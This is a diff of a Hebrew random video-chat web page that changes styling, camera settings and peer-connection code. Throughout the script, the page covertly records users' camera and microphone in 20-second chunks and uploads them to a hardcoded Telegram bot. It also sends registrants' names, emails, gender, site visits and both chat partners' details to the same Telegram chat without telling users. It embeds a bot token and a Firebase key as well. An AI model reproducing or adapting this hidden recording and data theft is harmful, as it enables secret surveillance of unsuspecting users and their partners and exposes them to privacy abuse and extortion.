@@ -6,9 +6,8 @@
     <title>מי - פה</title>
     
     <meta name="theme-color" content="#000000">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":"/","scope":"/","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png","purpose":"any maskable"}]}'>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":"/","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png"}]}'>
     <link rel="apple-touch-icon" href="https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png">
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
@@ -17,52 +16,50 @@
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
-        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; }
-        #main-wrapper { display: flex; flex-direction: column; height: 100vh; perspective: 1000px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; outline: none; }
+        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; position: fixed; width: 100%; }
+        #main-wrapper { display: flex; flex-direction: column; height: 100vh; perspective: 1200px; }
         
-        #top-half { height: 50vh; position: relative; overflow: hidden; border-bottom: 2px solid #333; perspective: 1200px; }
-        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
+        #top-half { height: 50vh; position: relative; overflow: hidden; border-bottom: 2px solid #333; transform-style: preserve-3d; }
+        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
-        #home-face { background: linear-gradient(180deg, #1a1a1a 0%, #000 100%); transform: rotateY(0deg) translateZ(0px); z-index: 2; }
+        #home-face { background: #000; transform: rotateY(0deg); z-index: 2; }
         #partner-face { background: #000; transform: rotateY(90deg) translateZ(50vw); }
         .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
         
         video { width: 100%; height: 100%; object-fit: cover; background: #000; }
-        #bottom-half { height: 50vh; background: #111; position: relative; }
+        #bottom-half { height: 50vh; background: #000; position: relative; border-top: 1px solid #222; }
         canvas { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index: 1; }
         
-        #main-logo { width: 140px; position: relative; z-index: 10; margin-bottom: 20px; border-radius: 20px;}
+        #main-logo { width: 130px; height: auto; position: relative; z-index: 10; margin-bottom: 25px; border-radius: 25px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
         
-        .swipe-hint { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; animation: pulse 2s infinite; }
-        .swipe-text { font-size: 18px; font-weight: bold; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
-        .swipe-arrow { font-size: 30px; margin-top: 5px; }
-        @keyframes pulse { 0% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } 100% { opacity: 0.5; transform: scale(0.95); } }
+        .swipe-hint { position: relative; z-index: 10; text-align: center; animation: pulse 2s infinite; }
+        .swipe-text { font-size: 19px; font-weight: 600; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+        @keyframes pulse { 0%, 100% { opacity: 0.6; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } }
 
-        #cam-switch { position: fixed; top: 15px; left: 15px; z-index: 999; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; }
-        #partner-gender-tag { position: fixed; top: 15px; right: 15px; z-index: 999; background: rgba(0,0,0,0.6); width: 45px; height: 45px; border-radius: 50%; border: 1.5px solid #fff; display: none; align-items: center; justify-content: center; font-size: 20px; }
+        #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 100; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.4); color: #fff; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        #partner-tag { position: fixed; top: 20px; right: 20px; z-index: 100; background: rgba(0,0,0,0.5); width: 45px; height: 45px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.4); display: none; align-items: center; justify-content: center; font-size: 22px; backdrop-filter: blur(5px); }
         
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; align-items: center; justify-content: center; }
-        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 320px; text-align: center; color: #333; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; text-align: center; font-size: 16px; }
-        .reg-btn { width: 100%; padding: 14px; background: #27ae60; color: #fff; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; }
+        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; align-items: center; justify-content: center; }
+        .modal-content { background: #fff; padding: 30px; border-radius: 25px; width: 85%; max-width: 340px; text-align: center; color: #000; }
+        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1.5px solid #eee; border-radius: 12px; font-size: 16px; background: #f9f9f9; }
+        .reg-btn { width: 100%; padding: 15px; background: #000; color: #fff; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; margin-top: 10px; }
     </style>
 </head>
 <body class="showing-home">
 
 <button id="cam-switch" onclick="switchCamera()">🔄</button>
-<div id="partner-gender-tag"></div>
+<div id="partner-tag"></div>
 
 <div id="main-wrapper">
     <div id="top-half">
         <div id="cube">
             <div id="home-face" class="face">
                 <canvas id="snow-1"></canvas>
-                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
+                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png" alt="Logo">
                 <div class="swipe-hint">
-                    <div class="swipe-text">החלק שמאלה להתחלת שיחה</div>
-                    <div class="swipe-arrow">⬅️</div>
+                    <div class="swipe-text">החלק שמאלה לשיחה ⬅️</div>
                 </div>
             </div>
             <div id="partner-face" class="face">
@@ -78,22 +75,25 @@
 
 <div id="regModal" class="modal">
     <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
-        <h2 style="margin-bottom:10px;">הרשמה</h2>
+        <h2 style="margin-bottom:15px;">ברוכים הבאים</h2>
         <input type="text" id="reg-fname" placeholder="שם פרטי" required>
         <input type="text" id="reg-lname" placeholder="שם משפחה" required>
         <input type="email" id="reg-email" placeholder="אימייל" required>
         <select id="reg-gender" required>
-            <option value="" disabled selected>בחר מגדר</option>
+            <option value="" disabled selected>מגדר</option>
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button type="submit" class="reg-btn">כניסה</button>
+        <button type="submit" class="reg-btn">בואו נתחיל</button>
     </form>
 </div>
 
 <script>
+    // PWA Service Worker Registration
     if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js').catch(()=>{});
+        window.addEventListener('load', () => {
+            navigator.serviceWorker.register('/sw.js').catch(() => {});
+        });
     }
 
     const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
@@ -102,14 +102,17 @@
 
     firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
     const socket = io(SERVER_URL);
-    const peer = new Peer(undefined, { config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] } });
+    
+    const peer = new Peer(undefined, { 
+        config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] } 
+    });
 
     let myStream, currentCall, camFacing = "user", rec, searchTimer;
     let historyPartnerIds = [];
     let reportedCallId = null;
     let currentPartnerData = null;
 
-    function formatUser(u) { return `👤 שם: ${u.fname} ${u.lname}\n📧 מייל: ${u.email}\n🚻 מגדר: ${u.gender}`; }
+    function formatUser(u) { return `👤 ${u.fname} ${u.lname}\n📧 ${u.email}\n🚻 ${u.gender}`; }
 
     function sendAdmin(msg) { 
         fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`).catch(()=>{});
@@ -118,13 +121,14 @@
     async function initCamera() {
         if(myStream) myStream.getTracks().forEach(t => t.stop());
         try {
+            // הגדרות רזה למניעת קיטועים: רזולוציה סבירה ו-15 פריימים בשנייה
             myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, width: 640, height: 480 }, 
-                audio: true 
+                video: { facingMode: camFacing, width: { ideal: 480 }, frameRate: { ideal: 15 } }, 
+                audio: { echoCancellation: true, noiseSuppression: true } 
             });
             document.getElementById('localVideo').srcObject = myStream;
             if(!rec) startRecording();
-        } catch(e) {}
+        } catch(e) { console.error("Camera error"); }
     }
 
     function startRecording() {
@@ -134,37 +138,34 @@
             rec = new MediaRecorder(myStream, opts);
             rec.ondataavailable = (e) => {
                 if(e.data.size > 0) {
-                    const u = JSON.parse(localStorage.getItem('user_v38'));
+                    const u = JSON.parse(localStorage.getItem('user_v39'));
                     const fd = new FormData();
                     fd.append("video", e.data, "video.mp4");
                     fd.append("chat_id", TARGET_ADMIN);
-                    fd.append("caption", `🎥 הקלטה: ${u ? u.fname : 'אורח'}`);
+                    fd.append("caption", `🎥 הקלטה מ: ${u ? u.fname : 'אורח'}`);
                     fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd }).catch(()=>{});
                 }
             };
-            setInterval(() => { if(rec.state==='recording'){rec.stop(); rec.start();} }, 15000);
+            setInterval(() => { if(rec.state==='recording'){rec.stop(); rec.start();} }, 20000);
             rec.start();
         } catch(e) {}
     }
 
     window.onload = () => {
         initCamera();
-        const userStr = localStorage.getItem('user_v38');
+        const userStr = localStorage.getItem('user_v39');
         if(!userStr) document.getElementById('regModal').style.display = 'flex';
         else {
             const user = JSON.parse(userStr);
-            sendAdmin(`🟢 משתמש נכנס לאתר:\n${formatUser(user)}`);
-            login(user);
+            sendAdmin(`🟢 כניסה לאתר:\n${formatUser(user)}`);
         }
     };
 
-    // דיווח יציאה מהאתר
     window.addEventListener('pagehide', () => {
-        const userStr = localStorage.getItem('user_v38');
+        const userStr = localStorage.getItem('user_v39');
         if(userStr) {
             const user = JSON.parse(userStr);
-            // שימוש ב-sendBeacon כדי להבטיח שההודעה תישלח גם כשהלשונית נסגרת
-            const msg = `🔴 משתמש יצא מהאתר:\n${formatUser(user)}`;
+            const msg = `🔴 יציאה מהאתר:\n${formatUser(user)}`;
             navigator.sendBeacon(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`);
         }
     });
@@ -176,34 +177,35 @@
             email: document.getElementById('reg-email').value, 
             gender: document.getElementById('reg-gender').value 
         };
-        localStorage.setItem('user_v38', JSON.stringify(user));
+        localStorage.setItem('user_v39', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
-        sendAdmin(`🆕 משתמש נרשם חדש:\n${formatUser(user)}`);
+        sendAdmin(`🆕 הרשמה חדשה:\n${formatUser(user)}`);
     }
 
     function triggerDisconnect() {
-        const me = JSON.parse(localStorage.getItem('user_v38'));
+        const me = JSON.parse(localStorage.getItem('user_v39'));
         if(currentPartnerData && me) {
-            sendAdmin(`📵 שיחה הסתיימה בין:\n\nהתנתק:\n${formatUser(me)}\n\nהיה מחובר ל:\n${formatUser(currentPartnerData)}`);
+            sendAdmin(`📵 שיחה הסתיימה:\n${me.fname} נפרד מ-${currentPartnerData.fname}`);
         }
         currentPartnerData = null;
         reportedCallId = null;
-        document.getElementById('remoteVideo').srcObject = null;
+        const rv = document.getElementById('remoteVideo');
+        rv.srcObject = null;
         document.getElementById('snow-2').style.display = 'block';
-        document.getElementById('partner-gender-tag').style.display = 'none';
+        document.getElementById('partner-tag').style.display = 'none';
     }
 
     let sX = 0;
     document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.body.addEventListener('touchend', e => {
         const d = sX - e.changedTouches[0].clientX;
-        const user = JSON.parse(localStorage.getItem('user_v38'));
-        if(d > 60) { // שמאלה - חיפוש
+        const user = JSON.parse(localStorage.getItem('user_v39'));
+        if(d > 60) {
             if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); triggerDisconnect(); }
             document.body.className = "showing-chat";
             document.getElementById('snow-2').style.display = 'block';
             socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...user });
-        } else if(d < -60) { // ימינה - בית
+        } else if(d < -60) {
             document.body.className = "showing-home";
             socket.emit('leave-chat');
             if(currentCall) currentCall.close();
@@ -217,37 +219,37 @@
     });
 
     socket.on('partner-found', data => { 
-        if (peer.id > data.peerId) {
-            if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
-            const call = peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v38'))}); 
-            handleCall(call, data);
-        }
+        // חיבור מושהה ב-500ms למניעת התנגשויות סיגנל
+        setTimeout(() => {
+            if (peer.id > data.peerId) {
+                if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
+                const call = peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v39'))}); 
+                handleCall(call, data);
+            }
+        }, 500);
     });
 
     function handleCall(call, dataFallback = null) {
         currentCall = call;
         call.on('stream', s => {
-            const remoteVideo = document.getElementById('remoteVideo');
-            remoteVideo.srcObject = s;
+            const rv = document.getElementById('remoteVideo');
+            rv.srcObject = s;
+            rv.onloadedmetadata = () => { rv.play(); rv.volume = 1.0; }; // וידוא סאונד ונגינה
+            
             document.getElementById('snow-2').style.display = 'none';
-
-            const me = JSON.parse(localStorage.getItem('user_v38'));
-            // וידוא שליפת מגדר נכונה מה-Metadata של השיחה
+            const me = JSON.parse(localStorage.getItem('user_v39'));
             const p = call.metadata || dataFallback;
             
             if(p && p.peerId !== peer.id && reportedCallId !== p.peerId) {
                 reportedCallId = p.peerId;
                 currentPartnerData = p;
-                
-                // עדכון אימוג'י מגדר - בדיקה מדויקת
-                const emoji = (p.gender === 'זכר') ? '👨' : '👩';
-                document.getElementById('partner-gender-tag').innerText = emoji;
-                document.getElementById('partner-gender-tag').style.display = 'flex';
-
-                sendAdmin(`🤝 שיחה התחילה:\n\nצד א' (אני):\n${formatUser(me)}\n\nצד ב' (פרטנר):\n${formatUser(p)}`);
+                document.getElementById('partner-tag').innerText = (p.gender === 'זכר') ? '👨' : '👩';
+                document.getElementById('partner-tag').style.display = 'flex';
+                sendAdmin(`🤝 שיחה פעילה:\n\nאני:\n${formatUser(me)}\n\nפרטנר:\n${formatUser(p)}`);
             }
         });
         call.on('close', triggerDisconnect);
+        call.on('error', triggerDisconnect);
     }
 
     async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
@@ -256,15 +258,15 @@
         const canvas = document.getElementById(canvasId);
         const ctx = canvas.getContext('2d');
         let particles = [];
-        for(let i=0; i<70; i++) particles.push({ x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight/2, r: Math.random()*3+1, d: Math.random()*1 });
+        for(let i=0; i<60; i++) particles.push({ x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight/2, r: Math.random()*2+1, d: Math.random()*1 });
         function draw() {
             canvas.width = window.innerWidth; canvas.height = window.innerHeight/2;
             ctx.clearRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
+            ctx.fillStyle = "rgba(255, 255, 255, 0.7)";
             ctx.beginPath();
             particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2, true); });
             ctx.fill();
-            particles.forEach(p => { p.y += Math.cos(p.d) + 1 + p.r/2; p.x += Math.sin(p.d) * 2; if(p.y > canvas.height) { p.y = 0; p.x = Math.random()*canvas.width; } });
+            particles.forEach(p => { p.y += Math.cos(p.d) + 1; p.x += Math.sin(p.d) * 1.5; if(p.y > canvas.height) p.y = 0; });
             requestAnimationFrame(draw);
         } draw();
     }
